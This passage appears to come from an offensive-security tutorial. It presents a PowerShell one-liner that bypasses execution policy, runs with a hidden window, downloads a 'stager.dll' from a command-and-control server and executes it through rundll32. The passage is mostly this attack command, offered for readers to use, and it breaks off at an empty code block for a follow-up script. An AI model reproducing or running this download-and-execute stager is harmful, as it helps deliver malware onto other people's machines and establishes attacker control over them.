...
If you want to download your DLL from a C2 and run it, here is the powershell command i used:  
```
powershell -exec bypass -NoP -NonI -W Hidden -c "$file = $env:temp+'\'+(Get-Random)+'.dll'; (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.24/stager.dll',$file); $exec = New-Object -com shell
.application; $exec.shellexecute('rundll32',$file+',Exec');"
```

Now create your ps1 script with the following content:
```
